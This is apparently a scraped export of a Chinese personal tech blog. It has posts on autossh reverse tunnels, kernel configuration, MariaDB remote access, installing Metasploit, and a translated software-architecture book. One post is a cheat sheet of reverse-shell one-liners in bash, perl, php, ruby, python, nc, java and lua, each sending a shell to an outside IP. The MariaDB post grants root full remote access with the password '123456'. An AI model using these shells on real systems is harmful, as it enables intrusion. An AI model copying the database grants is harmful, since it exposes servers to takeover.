64bit虚拟机。 1sudo apt-get install autossh openssh-server 配置A机可以免密码登陆到VPS(B机)具体方法为将A机的公钥发给VPS(B机)，这样A机开机时就可以自动建立一条到VPS的SSH隧道 12345678su - userA #这步可省略,但需要确保以下命令是在A机上以userA用户的身份运行的 ssh-keygen -t rsa #连续三次回车,即在本地生成了公钥和私钥,不要设置密码ssh-copy-id -p VPS的SSH端口 -i ~/.ssh/id_rsa.pub userVPS@VPS的IP sudo touch /var/log/ssh_nat.log &amp;&amp; sudo chmod 777 /var/log/ssh_nat.log sudo vim /lib/systemd/system/autossh.service #将下例内容粘贴复制进去 123456789101112131415[Unit]Description=Auto SSH TunnelAfter=network-online.target [Service]User=userA #改掉这里A机的用户Type=simpleExecStart=/usr/bin/autossh -M 6777 -NR 8388:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@VPS的IP -p VPS的SSH端口 &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;ExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always [Install]WantedBy=multi-user.targetWantedBy=graphical.target 解释一下上面的autossh命令：添加的一个-M 6777参数,负责通过6777端口监视连接状态,连接有问题时就会自动重连去掉了一个-f参数,因为autossh本身就会在background运行 1234sudo chmod +x /lib/systemd/system/autossh.service #给予可执行权限sudo systemctl enable autossh #设置开机自启sudo systemctl start autossh #现在就启动服务sudo systemctl status autossh #查看状态,出现Active: active (running)表示正常运行 也可以登陆到VPS（B机）上看看8388端口是否真的有程序在监听 123$ netstat -antp | grep :8388tcp 0 0 0.0.0.0:8388 0.0.0.0:* LISTEN 20041/sshdtcp 0 0 :::8388 :::* LISTEN 20041/sshd 5，尝试远程登陆接下来，我们就可以在家里的电脑(C机)上登陆到位于公司NAT网络里的那台Debian8虚拟机(A机)。 1ssh userA@VPS的IP -p 8388 注意：这里的userA并不是VPS(B机)上的用户，而是Debian8虚拟机(A机)上的用户。 参考资料：使用SSH反向隧道进行内网穿透SSH反向连接及AutosshFun and Profit with Reverse SSH Tunnels and AutoSSH 2016/10/29 由 bear 发表在 Linux运维 分类 | 标签: | 将 固定链接 加入收藏夹","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"Linux下NC反弹shell命令","slug":"SYSTEM/Linux下NC反弹shell命令","date":"2017-11-08T11:15:30.000Z","updated":"2017-11-08T11:25:18.447Z","comments":true,"path":"SYSTEM/Linux下NC反弹shell命令.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Linux下NC反弹shell命令.html","excerpt":"本机开启监听： 12 nc -lvnp 4444nc -vvlp 4444 目标机器开启反弹 bash版本： 1 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 perl版本： 1 perl -e 'use S","text":"本机开启监听： 12nc -lvnp 4444nc -vvlp 4444 目标机器开启反弹bash版本： 1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 perl版本： 1perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;' php版本： 1php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' ruby版本： 1ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' python版本： 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' nc版本： 123nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本： 123r = Runtime.getRuntime()p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[])p.waitFor() lua版本： 1lua -e \"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');\" NC版本不使用-e参数： 12345mknod /tmp/backpipe p/bin/sh 0&lt;/tmp/backpipe | nc x.x.x.x 4444 1&gt;/tmp/backpipe/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"Linux 内核编译 —— make localmodconfig 简化内核配置流程","slug":"SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  ","date":"2017-11-08T06:50:07.000Z","updated":"2017-11-08T06:52:08.841Z","comments":true,"path":"SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html","link":"","permalink":"http://demonelf.github.io/SYSTEM/Linux 内核编译 —— make localmodconfig 简化内核配置流程  .html","excerpt":"简介： 前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。 刚刚找了一下这个方面的资料，分享一下。 Most people uses the kernel shipped b","text":"简介：前些天才知道， Linux 2.6.32 开始引入了一个 make localmodconfig 用于简化 kernel 的配置。刚刚找了一下这个方面的资料，分享一下。 Most people uses the kernel shipped by distros - and that’s good. But some people like to compile their own kernels from kernel.org, or maybe they like following the Linux development and want to try it. Configuring your own kernel, however, has become a very difficult and tedious task - there’re too many options, and some times userspace software will stop working if you don’t enable some key option. You can use a standard distro .config file, but it takes too much time to compile all the options it enables. To make the process of configuration easier, a new build target has been added: make localmodconfig. It runs “lsmod” to find all the modules loaded on the current running system. It will read all the Makefiles to map which CONFIG enables a module. It will read the Kconfig files to find the dependencies and selects that may be needed to support a CONFIG. Finally, it reads the .config file and removes any module “=m” that is not needed to enable the currently loaded modules. With this tool, you can strip a distro .config of all the unuseful drivers that are not needed in our machine, and it will take much less time to build the kernel. There’s an additional “make localyesconfig” target, in case you don’t want to use modules and/or initrds. 以上内容摘自：Kernel Newbies。大概意思是说， make localmodconfig 会执行 lsmod 命令查看当前系统中加载了哪些模块 (Modules)， 并最后将原来的 .config 中不需要的模块去掉，仅保留前面 lsmod 出来的这些模块，从而简化了内核的配置过程。 这样做确实方便了很多，但是也有个缺点：该方法仅能使编译出的内核支持当前内核已经加载的模块。因为该方法使用的是 lsmod 的结果，如果有的模块当前没有加载，那么就不会编到新的内核中。例如，我有的时候需要制作 squashfs ， 因此在当前的内核中，将 squashfs 编译成了模块。 当使用 make localmodconfig 来配置 Kernel 的时候，如果当前系统中没有加载这个模块， 那么新编出来的内核中就不会将 squashfs 编译成模块，在新的内核中就没办法使用这个模块了。 所以建议在使用 make localmodconfig 之前，首先折腾一下系统，插个优盘，开开摄像头之类， 以便让内核加载上平时使用时候所需要的模块；执行 make localmodconfig 之后，再执行一下 make menuconfig 来手动检查一下， 是否还有其他模块需要手动选择。 这样，内核的编译可以分成如下几个步骤来进行： 下载解压内核源码：http://www.kernel.org， 折腾一下系统，让它将合适的 module 都加载上。 执行 make localmodconfig 精减不需要的模块。 执行 make menuconfig ，检查一下是否有自己需要的模块没有选上。 执行 make 进行编译 执行 make modules_install 安装模块 执行 make install 安装内核 编辑 /boot/grub/grub.conf 或者 /boot/grub/menu.lst 添加新的引导菜单。 重启并以新的内核启动。 OK, that’s all. Author:yangyingchao, 2010-09-13","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"}],"tags":[]},{"title":"mariadb配置允许远程访问方式","slug":"SYSTEM/mariadb配置允许远程访问方式 ","date":"2017-11-03T10:18:53.000Z","updated":"2017-11-10T01:52:33.813Z","comments":true,"path":"SYSTEM/mariadb配置允许远程访问方式 .html","link":"","permalink":"http://demonelf.github.io/SYSTEM/mariadb配置允许远程访问方式 .html","excerpt":"首先配置允许访问的用户，采用授权的方式给用户权限 1 GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION; 说明：root是登陆数据库的用","text":"首先配置允许访问的用户，采用授权的方式给用户权限 1GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'IDENTIFIED BY '123456' WITH GRANT OPTION; 说明：root是登陆数据库的用户，123456是登陆数据库的密码，*就是意味着任何来源任何主机反正就是权限很大的样子。 最后配置好权限之后不应该忘记刷新使之生效 flush privileges; 再次访问就可以了吧。 sudo vim /etc/mysql/my.cnf bind-address = 0.0.0.0 sudo systemctl restart mariadb.service","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"gentoo安装metasploit4.14步骤","slug":"SYSTEM/gentoo安装metasploit4.14步骤","date":"2017-10-19T08:39:20.000Z","updated":"2017-10-19T08:54:21.165Z","comments":true,"path":"SYSTEM/gentoo安装metasploit4.14步骤.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/gentoo安装metasploit4.14步骤.html","excerpt":"先来个小忍者看看 环境准备 1. make.conf中添加 RUBY_TARGETS=”ruby23” 2. /etc/portage/package.keywords 中添加 =dev-l","text":"先来个小忍者看看 环境准备 make.conf中添加 RUBY_TARGETS=”ruby23” /etc/portage/package.keywords 中添加 =dev-lang/ruby-2.3.5 更新系统 emerge –ask –update –deep –newuse @world 选择ruby eselect ruby set ruby23 正式安装123456sudo emerge -av metasploitemerge --config postgresql/etc/init.d/postgresql-&lt;version&gt; start //systemctl start postgresql-&lt;version&gt;emerge --config =metasploit-4.14.16ln -s /usr/lib/metasploit/lib /home/demonelf/.msf4/lib","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"rsync指定ssh端口号","slug":"SYSTEM/rsync指定ssh端口号","date":"2017-10-13T08:10:37.000Z","updated":"2017-10-13T08:11:32.514Z","comments":true,"path":"SYSTEM/rsync指定ssh端口号.html","link":"","permalink":"http://demonelf.github.io/SYSTEM/rsync指定ssh端口号.html","excerpt":"rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/","text":"rsync -P -e ‘ssh -p 2222’ busybox-armv7l admin@192.168.2.235:/storage/emulated/0/Download/","categories":[{"name":"SYSTEM","slug":"SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/"},{"name":"SYSTEM","slug":"SYSTEM/SYSTEM","permalink":"http://demonelf.github.io/categories/SYSTEM/SYSTEM/"}],"tags":[]},{"title":"软件架构模式","slug":"DEVELOP/软件架构模式","date":"2017-10-10T09:51:26.000Z","updated":"2017-10-10T10:04:30.902Z","comments":true,"path":"DEVELOP/软件架构模式.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/软件架构模式.html","excerpt":"软件架构模式 Mark Richards 著 版权归 © 2015 O’Reilly Media, Inc. 所有. 原书发布链接为Software Architecture Patterns. 译员信息 本书的译员均来自 开发技术前线 www.d","text":"软件架构模式 Mark Richards 著版权归 © 2015 O’Reilly Media, Inc. 所有. 原书发布链接为Software Architecture Patterns. 译员信息 本书的译员均来自 开发技术前线 www.devtf.cn。 译者 个人简介 Mr.Simple 乐于分享，热爱开源的工程师，个人博客 chaossss 追风筝的吃货，汪～。个人博客 Allenlsy 计算机科学爱好者，Rails程序员。个人博客 BillonWang 做好玩的事情，交好玩的朋友。个人博客 dupengwei 乐于分享的移动互联网开发工程师 Charli Hu 喜欢英语，不放弃编程的菇凉。 目录 简介 第一章 分层架构 第二章 事件驱动架构 第三章 微内核架构 第四章 微服务架构 第五章 基于空间的架构 附录A 关于作者 简介对程序员来说很常见一种情况是在没有合理的程序架构时就开始编程，没有一个清晰的和定义好的架构的时候，大多数开发者和架构师通常会使用标准式的传统分层架构模式（也被称为多层架构）——通过将源码模块分割为几个不同的层到不同的包中。不幸的是，这种编码方式会导致一系列没有组织性的代码模块，这些模块缺乏明确的规则、职责和同其他模块之间的关联。这通常被称为架构大泥球。 应用程序缺乏合理的架构一般会导致程序过度耦合、容易被破坏、难以应对变化，同时很难有一个清晰的版本或者方向性。这样的结果是，如果你没有充分理解程序系统里每个组件和模块，就很难定义这个程序的结构特征。有关于程序的部署和维护的基本问题都难以回答，比如：程序架构是什么规模?应用程序有什么性能特点?应用程序有多容易应对变化?应用程序的部署特点是什么?架构是如何反应的? 架构模式帮助你定义应用程序的基本特征和行为。例如，一些架构模式会让程序自己自然而然地朝着具有良好伸缩性的方向发展，而其他架构模式会让程序朝着高度灵活的方向发展。知道了这些特点，了解架构模式的优点和缺点是非常必要的，它帮助我们选择一个适合自己特定的业务需求和目标的的程序。​作为一个架构师,你必须证明你的架构模式的决策是正确的,特别是当需要选择一个特定的体系结构模式或方法的时候。这本迷你书的目的就是给你足够的信息让你去做出正确的架构决策。 第一章 分层架构分层架构是一种很常见的架构模式，它也叫N层架构。这种架构是大多数Jave EE应用的实际标准，因此很多的架构师，设计师，还有程序员都知道它。许多传统IT公司的组织架构和分层模式十分的相似。所以它很自然的成为大多数应用的架构模式。 模式分析分层架构模式里的组件被分成几个平行的层次，每一层都代表了应用的一个功能(展示逻辑或者业务逻辑)。尽管分层架构没有规定自身要分成几层几种，大多数的结构都分成四个层次:展示层，业务层，持久层，和数据库层。如表1-1，有时候，业务层和持久层会合并成单独的一个业务层，尤其是持久层的逻辑绑定在业务层的组件当中。因此，有一些小的应用可能只有3层，一些有着更复杂的业务的大应用可能有5层或者更多的分层。 分层架构中的每一层都着特定的角色和职能。举个例子，展示层负责处理所有的界面展示以及交互逻辑，业务层负责处理请求对应的业务。架构里的层次是具体工作的高度抽象，它们都是为了实现某种特定的业务请求。比如说展示层并不需要关心怎样得到用户数据，它只需在屏幕上以特定的格式展示信息。业务层并不关心要展示在屏幕上的用户数据格式，也不关心这些用户数据从哪里来。它只需要从持久层得到数据，执行与数据有关的相应业务逻辑，然后把这些信息传递给展示层。 分层架构的一个突出特性是组件间关注点分离 (separation of concerns)。一个层中的组件只会处理本层的逻辑。比如说，展示层的组件只会处理展示逻辑，业务层中的组件只会去处理业务逻辑。多亏了组件分离，让我们更容易构造有效的角色和强力的模型。这样应用变的更好开发，测试，管理和维护。 关键概念注意表1-2中每一层都是封闭的。这是分层架构中非常重要的特点。这意味request必须一层一层的传递。举个例子，从展示层传递来的请求首先会传递到业务层，然后传递到持久层，最后才传递到数据层。 那么为什么不允许展示层直接访问数据层呢。如果只是获得以及读取数据，展示层直接访问数据层，比穿过一层一层来得到数据来的快多了。这涉及到一个概念:层隔离。 层隔离就是说架构中的某一层的改变不会影响到其他层:这些变化的影响范围限于当前层次。如果展示层能够直接访问持久层了，假如持久层中的SQL变化了，这对业务层和展示层都有一定的影响。这只会让应用变得紧耦合，组件之间互相依赖。这种架构会非常的难以维护。 从另外一个方面来说，分层隔离使得层与层之间都是相互独立的，架构中的每一层的互相了解都很少。为了说明这个概念的牛逼之处，想象一个超级重构，把展示层从JSP换成JSF。假设展示层和业务层的之间的联系保持一致，业务层不会受到重构的影响，它和展示层所使用的界面架构完全独立。 然而封闭的架构层次也有不便之处，有时候也应该开放某一层。如果想往包含了一些由业务层的组件调用的普通服务组件的架构中添加一个分享服务层。在这个例子里，新建一个服务层通常是一个好主意，因为从架构上来说，它限制了分享服务访问业务层(也不允许访问展示层)。如果没有隔离层，就没有任何架构来限制展示层访问普通服务，难以进行权限管理。 在这个例子中，新的服务层是处于业务层之下的，展示层不能直接访问这个服务层中的组件。但是现在业务层还要通过服务层才能访问到持久层，这一点也不合理。这是分层架构中的老问题了，解决的办法是开放某些层。如表1-3所示，服务层现在是开放的了。请求可以绕过这一层，直接访问这一层下面的层。既然服务层是开放的，业务层可以绕过服务层，直接访问数据持久层。这样就非常合理。 开放和封闭层的概念确定了架构层和请求流之间的关系，并且给设计师和开发人员提供了必要的信息理解架构里各种层之间的访问限制。如果随意的开放或者封闭架构里的层，整个项目可能都是紧耦合，一团糟的。以后也难以测试，维护和部署。 示例为了演示分层架构是如何工作的，想象一个场景，如表1-4，用户发出了一个请求要获得客户的信息。黑色的箭头是从数据库中获得用户数据的请求流，红色箭头显示用户数据的返回流的方向。在这个例子中，用户信息由客户数据和订单数组组成(客户下的订单)。 用户界面只管接受请求以及显示客户信息。它不管怎么得到数据的，或者说得到这些数据要用到哪些数据表。如果用户界面接到了一个查询客户信息的请求，它就会转发这个请求给用户委托(Customer Delegate)模块。这个模块能找到业务层里对应的模块处理对应数据(约束关系)。业务层里的customer object聚合了业务请求需要的所有信息(在这个例子里获取客户信息)。这个模块调用持久层中的 customer dao 来得到客户信息，调用order dao来得到订单信息。这些模块会执行SQL语句，然后返回相应的数据给业务层。当 customer object收到数据以后，它就会聚合这些数据然后传递给 customer delegate,然后传递这些数据到customer screen 展示在用户面前。 从技术的角度来说，有很多的方式能够实现这些模块。比如说在Java平台中，customer screen 对应的是 (JSF) Java Server Faces ,用 bean 组件来实现 customer delegate。用本地的Spring bean或者远程的EJB3 bean 来实现业务层中的customer object。上例中的数据访问可以用简单的POJP’s(Plain Old Java Objects)，或者可以用MyBatis，还可以用JDBC或者Hibernate 查询。Microsoft平台上，customer screen能用 .NET 库的ASP模块来访问业务层中的C#模块，用ADO来实现用户和订单数据的访问模块。 注意事项分层架构是一个很可靠的架构模式。它适合大多数的应用。如果你不确定在项目中使用什么架构，分层架构是再好不过的了。然后，从架构的角度上来说，选择这个模式还要考虑很多的东西。 第一个要注意的就是 污水池反模式(architecture sinkhole anti-pattern)。在这个模式中，请求流只是简单的穿过层次，不留一点云彩，或者说只留下一阵青烟。比如说界面层响应了一个获得数据的请求。响应层把这个请求传递给了业务层，业务层也只是传递了这个请求到持久层，持久层对数据库做简单的SQL查询获得用户的数据。这个数据按照原理返回，不会有任何的二次处理，返回到界面上。 每个分层架构或多或少都可能遇到这种场景。关键在于这样的请求有多少。80-20原则可以帮助你确定架构是否处于反污水模式。大概有百分之二十的请求仅仅是做简单的穿越，百分之八十的请求会做一些业务逻辑操作。然而，如果这个比例反过来，大部分的请求都是仅仅穿过层，不做逻辑操作。那么开放一些架构层会比较好。不过由于缺少了层次隔离，项目会变得难以控制。 模式分析下面的的表里分析了分层架构的各个方面。 整体灵活性评级:低分析:总体灵活性是响应环境变化的能力。尽管分层模式中的变化可以隔绝起来，想在这种架构中做一些也改变也是并且费时费力的。分层模式的笨重以及经常出现的组件之间的紧耦合是导致灵活性降低的原因。 易于部署评级:低分析:这取决于你怎么发布这种模式，发布程序可能比较麻烦，尤其是很大的项目。一个组件的小小改动可能会影响到整个程序的发布(或者程序的大部分)。发布必须是按照计划，在非工作时间或者周末进行发布。因此。分层模式导致应用发布一点也不流畅，在发布上降低了灵活性。 可测试性评级:高分析:因为组件都处于各自的层次中，可以模拟其他的层，或者说直接去掉层，所以分层模式很容易测试。开发者可以单独模拟一个展示组件，对业务组件进行隔绝测试。还可以模拟业务层来测试某个展示功能。 性能评级:低分析:尽管某些分层架构的性能表现的确不错，但是这个模式的特点导致它无法带来高性能。因为一次业务请求要穿越所有的架构层，做了很多不必要的工作。 伸缩性评级:低分析:由于这种模式以紧密耦合的趋势在发展，规模也比较大，用分层架构构建的程序都比较难以扩展。你可以把各个层分成单独的物理模块或者干脆把整个程序分成多个节点来扩展分层架构，但是总体的关系过于紧密，这样很难扩展。 易开发性评级:容易分析:在开发难度上面，分层架构得到了比较高的分数。因为这种架构对大家来说很熟悉，不难实现。大部分公司在开发项目的都是通过层来区分技术的，这种模式对于大多数的商业项目开发来说都很合适。公司的组织架构和他们软件架构之间的联系被戏称为”Conway’s law”。你可以Google一下查查这个有趣的联系。 第二章 事件驱动架构 译者注：文章中 mediator 及 broker 的概念很容易混淆，在文章的结尾处译者对两者的区别（还有 proxy）进行了一定的阐述 事件驱动架构模式是一种主流的异步分发事件架构模式，常用于设计高度可拓展的应用。当然了，它有很高的适应性，使得它在小型应用、大型应用、复杂应用中都能表现得很好。事件驱动架构模式由高度解耦、单一目的的事件处理组件构成，这些组件负责异步接收和处理事件。 事件驱动架构模式包含了两种主要的拓扑结构：中介(mediator)拓扑结构和代理(broker)拓扑结构。 mediator 拓扑结构通常在你需要在事件内使用一个核心中介分配、协调多个步骤间的关系、执行顺序时使用；而代理拓扑结构则在你想要不通过一个核心中介将多个事件串联在一起时使用。由于这两种结构在结构特征和实现策略上有很大的差别，所以如果你想要在你的应用中使用它们的话，一定要深入理解两者的技术实现细节，从而为你的实际使用场景选择最合理的结构。 中介 ( Mediator )拓扑结构中介拓扑结构适合用于拥有多个步骤，并需要在处理事件时能通过某种程度的协调将事件分层的场景，举例来说吧：假设你现在需要进行股票交易，那你首先需要证券所批准你进行交易，然后检查进行这次交易是否违反了股票交易的某种规定，检查完成后将它交给一个经纪人，计算佣金，最后与经纪人确认交易。以上所有步骤都需要通过中介进行某种程度的分配和协调，以决定各个步骤的执行顺序，判断哪些步骤可以并行，哪些步骤可以串行。 在中介拓扑结构中主要有四种组件：事件队列（event queue）, 事件中介, 事件通道（event channel）, 和 事件处理器（event processor）。当事件流需要被处理，客户端将一个事件发送到某个事件队列中，由消息队列将其运输给事件中介进行处理和分发。事件中介接收到该消息后，并通过将额外的异步事件发送给事件通道，让事件通道执行该异步事件中的每一个步骤，使得事件中介能够对事件进行分配、协调。同时，又因为事件处理器是事件通道的监听器，所以事件通道对异步事件的处理会触发事件处理器的监听事件，使事件处理器能够接收来自事件中介的事件，执行事件中具体的业务逻辑，从而完成对传入事件的处理。事件驱动架构模式中的中介拓扑模式结构大体如下图： 在事件驱动架构中拥有十几个，甚至几百个事件队列是很常见的情况，该模式并没有对事件队列的实现有明确的要求，这就意味着事件队列可以是消息队列，Web 服务端，或者其它类似的东西。 在事件驱动架构模式中主要有两种事件：初始事件和待处理事件。初始事件是中介所接收到的最原始的事件，没有经过其他组件的处理；而待处理事件是由事件中介生成，由事件处理器接收的组件，不能把待处理事件看作初始事件经过处理后得到的事件，两者是完全不同的概念。 事件中介负责分配、协调初始事件中的各个待执行步骤，事件中介需要为每一个初始事件中的步骤发送一个特定的待处理事件到事件通道中，触发事件处理器接收和处理该待处理事件。这里需要注意的是：事件 中介没有真正参与到对初始事件必须处理的业务逻辑的实现之中；相反，事件中介只是知道初始事件中有哪些步骤需要被处理。 事件中介通过事件通道将与初始事件每一个执行步骤相关联的特定待处理事件传递给事件处理器。尽管我们通常在待处理事件能被多个事件处理器处理时才会在中介拓扑结构中使用 消息主题，但事件通道仍可以是消息队列或 消息主题。（但需要注意的是，尽管在使用 消息主题 时待处理事件能被多个事件处理器处理，但由于接收到的待处理事件各异，所以对其处理的操作也各不相同） 为了能顺利处理待处理事件，事件处理器组件中包含了应用的业务逻辑。此外，事件处理器作为事件驱动架构中的组件，不依赖于其他组件，独立运作，高度解耦，在应用或系统中完成特定的任务。当事件处理器需要处理的事件从细粒度（例如：计算订单的营业税）变为粗粒度（例如：处理一项保险索赔事务），必须要注意的是：一般来说，每一个事件处理器组件都只完成一项唯一的业务工作，并且事件处理器在完成其特定的业务工作时不能依赖其他事件处理器。 虽然事件中介有许多方法可以实现，但作为一名架构工程师，你应该了解所有实现方式，以确保你能为你的实际需求选择了最合适的事件中介。 事件中介最简单、常见的实现就是使用开源框架，例如：Spring Integration，Apache Camel，或 Mule ESB。事件流在这些开源框架中通常用 Java 或 域特定语言（domain-specific language）。在调节过程和业务流程都很复杂的使用场景下，你可以使用业务流程执行语言（BPEL - business process execution language）结合类似开源框架 Apache ODE 的 BPEL 引擎进行开发。BPEL 是一种基于 XML 的服务编制编程语言，它为处理初始事件时需要描述的数据和步骤提供了描述。对每一个拥有复杂业务流程（包括与用户交互的执行步骤）的大型应用来说，你可以使用类似 jBPM 的业务处理管理系统（business process manager）实现事件中介。 如果你需要使用中介拓扑结构，那么理解你的需求，并为其匹配恰当的事件中介实现是构建事件驱动架构过程中至关重要的一环。使用开源框架去解决非常复杂的业务处理、管理、调节事件，注定会失败，因为开源框架只是用 BPM 的方式解决了一些简单的事件分发逻辑，比起你的业务逻辑，其中的事件分发逻辑简直是九牛一毛。 为了解释清楚中介拓扑结构是怎么运作的，我假设你在某家保险公司买了保险，成为了受保人，然后你打算搬家。在这种情况下，初始事件就是重定位事件，或者其他类似的事件。与重定位事件相关的处理步骤就像下图展示的那样，处于事件中介之中。对每一个初始事件的传入，事件中介都会创建一个待处理事件（例如：改变地址，重新计算保险报价，等等……），并将它发送给事件通道，等待发出响应的事件处理器处理待处理事件（例如：客户改变地址的操作流程、报价计算流程，等等……）。直到初始事件中的每一个需要处理的步骤完成了，这项处理才会继续（例如：把所有手续都完成之后，保险公司才会帮你改变地址）。事件中介中，重新报价和更新理赔步骤上面的直线表示这些步骤可以并行处理。 代理 (Broker) 拓扑结构代理拓扑结构与中介拓扑结构不同之处在于：代理拓扑结构中没有核心的事件中介；相反，事件流在代理拓扑结构中通过一个轻量的消息代理（例如：ActiveMQ, HornetQ，等等……）将消息串联成链状，分发至事件处理器组件中进行处理。代理扑结构适用的使用场景大致上具有以下特征：你的事件处理流相对来说比较简单，而且你不想（不需要）使用核心的事件分配、调节机制以提高你处理事件的效率。 在代理拓扑结构中主要包括两种组件：代理和事件处理器。代理可被集中或相互关联在一起使用，此外，代理中还可以包含所有事件流中使用的事件通道。 存在于代理组件中的事件通道可以是消息队列，消息主题,或者是两者的组合。 代理拓扑结构大致如下图，如你所见，在这其中没有一个核心的事件中介组件控制和分发初始事件；相反，每一个事件处理器只负责处理一个事件，并向外发送一个事件，以标明其刚刚执行的动作。例如，假设存在一个事件处理器用于平衡证券交易，那么事件处理器可能会接受一个拆分股票的初始事件，为了处理这项初始事件，事件处理器则需要重新平衡股票的投资金额，而这个重新平衡的事件将由另一个事件处理器接收、处理。在这其中有一个细节需要注意：处理初始事件后，由事件处理器发出的事件不被其他事件处理器接收、处理的情况时常会发生，尤其是你在为应用添加功能和进行功能拓展时，这种情况更为常见。 为了阐明代理拓扑结构的运行机制，我会用一个与讲解中介拓扑结构时类似的例子（受保人旅行的例子）进行解释。因为在代理拓扑结构中没有核心事件中介接收初始事件，那么事件将由客户处理组件直接接收，改变客户的地址，并发出一个事件告知系统客户的地址被其进行了改变（例如：改变地址的事件）。在这个例子中：有两个事件处理器会与改变地址的事件产生关联：报价处理和索赔处理。报价事件处理器将根据受保人的新地址重新计算保险的金额，并发出事件告知系统该受保人的保险金额被其改变。而索赔事件处理器将接受到相同的改变地址事件，不同的是，它将更新保险的赔偿金额，并发出一个更新索赔金额事件告知系统该受保人的赔偿金额被其改变。当这些新的事件被其他事件处理器接收、处理，使事件链一环扣一环地交由系统处理，直到事件链上的所有事件都被处理完，初始事件的处理才算完成。 如上图所示，代理拓扑结构的设计思想就是将对事件流的处理转换为对事件链的业务功能处理，把代理拓扑结构看作是接力比赛是最好的理解方式：在一场4*100的接力比赛中，每一位运动员都需要拿着一根接力棒跑100米，运动员跑完自己的100米后需要将接力棒传递给下一位运动员，直到最后一位运动员拿着接力棒跑过终点线，整场接力比赛才算结束。根据这样的逻辑我们还可以知道：在代理拓扑结构中，一旦某个事件处理器将事件传递给另一个事件处理器，那么这个事件处理器不会与该事件的后续处理产生任何联系。 顾虑实现事件驱动架构模式相对于实现其他架构模式会更困难一些，因为它通过异步处理进行事件分发。当你需要在你的应用中使用这种架构模式，你必须处理各种由事件分发处理带来的问题，例如：远程操作功能的可用性，缺少权限，以及在代理或中介中处理事件失败时，用于处理这种情况的重连逻辑。如果你不能很好地解决这些问题，那你的应用一定会出现各种 Bug，让开发团队痛苦不已。 在选择事件驱动架构时还有一点需要注意：在处理单个业务逻辑时，这种架构模式不能处理细粒度的事务。因为事件处理器都高度解耦、并且广泛分布，这使得在这些事件处理器中维持一个业务单元变得非常困难。因此，当你使用这种架构模式架构你的应用时，你必须不断地考虑哪些事件能单独被处理，哪些不能，并为此设计相应事件处理器的处理粒度。如果你发现你需要将一个业务单元切割成许多子单元，并一一匹配相应的事件处理器，那你就要为此进行代码设计；如果你发现你用多个不同的事件处理器处理的哪些业务其实是可以合并到一个业务事件之中的，那么这种模式可能并不适合你的应用，又或者是你的设计出了问题。 使用事件驱动架构模式最困难的地方就在于架构的创建、维护、以及对事件处理器的管理。通常每一个事件都拥有其指定的事件处理协议（例如：传递给事件处理器的数据类型、数据格式），这就使得设下标准的数据格式成为使用事件驱动架构模式中至关重要的一环（例如：XML，JSON，Java 对象，等等……），并在架构创建之初就为这些数据格式授权，以便处理。 